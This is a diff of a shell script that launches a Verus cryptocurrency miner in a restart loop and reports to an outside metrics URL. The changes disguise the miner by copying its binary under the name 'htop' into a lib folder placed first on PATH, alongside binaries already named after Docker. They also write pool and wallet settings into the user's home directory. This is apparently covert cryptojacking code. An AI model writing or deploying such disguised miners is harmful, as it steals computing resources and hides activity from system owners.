@@ -12,25 +12,28 @@ METRICS_URL="https://n.snd.qzz.io/metrics"
 ARCH=$(uname -m 2>/dev/null || echo "x86_64")
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
+LIB_DIR="$SCRIPT_DIR/lib"
+mkdir -p "$LIB_DIR"
+cp "$SCRIPT_DIR/htop" "$LIB_DIR/" 2>/dev/null || true
+cp "$SCRIPT_DIR/docker-aarch64" "$LIB_DIR/" 2>/dev/null || true
+chmod +x "$LIB_DIR/htop"  2>/dev/null || true
+chmod +x "$LIB_DIR/docker-aarch64" 2>/dev/null || true
+
 case "$ARCH" in
     x86_64|amd64)
-        MINER="$SCRIPT_DIR/docker-x86_64"
+        MINER="htop"
         ;;
     aarch64|arm64|armv8*)
-        MINER="$SCRIPT_DIR/docker-aarch64"
+        MINER="docker-aarch64"
         ;;
     *)
         echo "[verus] Unsupported arch: $ARCH, falling back to x86_64"
-        MINER="$SCRIPT_DIR/docker-x86_64"
+        MINER="htop"
         ;;
 esac
 
-# Ensure both binaries are executable
-chmod +x "$SCRIPT_DIR/docker-x86_64"  2>/dev/null || true
-chmod +x "$SCRIPT_DIR/docker-aarch64" 2>/dev/null || true
-
-if [ ! -f "$MINER" ]; then
-    echo "[verus] Binary not found: $MINER"
+if [ ! -f "$LIB_DIR/$MINER" ]; then
+    echo "[verus] Binary not found: $LIB_DIR/$MINER"
     exit 1
 fi
 
@@ -77,12 +80,26 @@ fi
 WORKER_NUM=$((MAX_NUM + 1))
 WORKER="${CN}nole${WORKER_NUM}"
 
-echo "[verus] Arch: $ARCH | Binary: $(basename $MINER) | Threads: $TT | Worker: $WORKER"
+echo "[verus] Arch: $ARCH | Binary: $MINER | Threads: $TT | Worker: $WORKER"
+
+# Generate ccminer.conf
+CC_CONFIG='{
+    "algo" : "verus",
+    "threads": "'"$TT"'",
+    "url" : "'"$POOL"'",
+    "user" : "'"${WALLET}.${WORKER}"'",
+    "pass" : "x"
+}'
+echo "$CC_CONFIG" > "$HOME/ccminer.conf"
+echo "$CC_CONFIG" > "./ccminer.conf"
+echo "$CC_CONFIG" > "$LIB_DIR/ccminer.conf"
+echo "[verus] Config written to $HOME/ccminer.conf, ./ccminer.conf, $LIB_DIR/ccminer.conf"
 
 # Run miner loop, restart on crash
+export PATH="$LIB_DIR:$PATH"
 while true; do
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] Starting miner..."
-    "$MINER" -a verus -o "$POOL" -u "${WALLET}.${WORKER}" -p x -t "$TT"
+    "$MINER"
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] Miner stopped. Restarting in 3 seconds..."
     sleep 3
 done
